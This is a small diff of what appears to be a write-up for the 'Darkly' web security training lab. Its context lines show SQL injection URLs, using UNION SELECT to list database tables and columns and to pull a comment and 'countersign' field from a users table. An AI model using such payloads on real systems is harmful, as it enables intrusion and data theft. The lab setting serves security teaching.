@@ -6,11 +6,7 @@ http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20TABLE_NAME,COLUMN_NAME%2
 
 http://[Darkly IP]/?page=member&id=5%20UNION%20SELECT%20Commentaire,countersign%20FROM%20Member_Sql_Injection.users&Submit=Submit#
 
-
-
-
 ## Patch
-
 
 ## Resources
 
